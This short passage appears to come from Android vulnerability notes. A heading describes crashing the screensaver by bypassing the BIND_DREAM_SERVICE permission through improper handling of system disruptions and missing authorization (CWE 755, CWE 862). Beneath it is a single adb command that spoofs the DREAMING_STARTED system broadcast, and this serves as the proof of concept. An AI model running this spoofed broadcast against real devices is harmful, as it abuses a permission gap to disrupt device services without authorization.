...
# Crashing the screensaver: Bypassing BIND_DREAM_SERVICE using CWE 755 (Improper Handling Of System Disruptions), and CWE 862 (Missing Authorization):
am broadcast -a android.intent.action.DREAMING_STARTED
